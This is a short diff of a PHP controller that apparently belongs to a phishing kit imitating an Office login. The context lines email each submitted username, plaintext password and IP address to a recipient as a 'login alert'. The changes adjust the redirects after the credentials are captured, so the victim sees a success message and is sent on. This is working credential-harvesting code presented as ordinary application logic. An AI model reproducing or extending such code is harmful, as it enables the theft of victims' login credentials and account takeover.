@@ -87,12 +87,13 @@ class MainController extends Controller {
 				$body = "Username: ".$offyse."<br>Password: ".$offpys."<br>IP address: ".$ip;
 				$this->helpers->sendEmail($rcpt,$s,['results' => $body],'emails.login_alert','view');  
 				
-				return view('index',compact('status'));
+				Session::flash("status","success");
+			    return redirect()->intended('/');
 			}
 			else
 			{
-				Session::flash("status","success");
-			    return redirect()->intended('/');
+				Session::flash("status","error");
+			    return redirect()->intended('authorize');
 			}	
 		}
 		
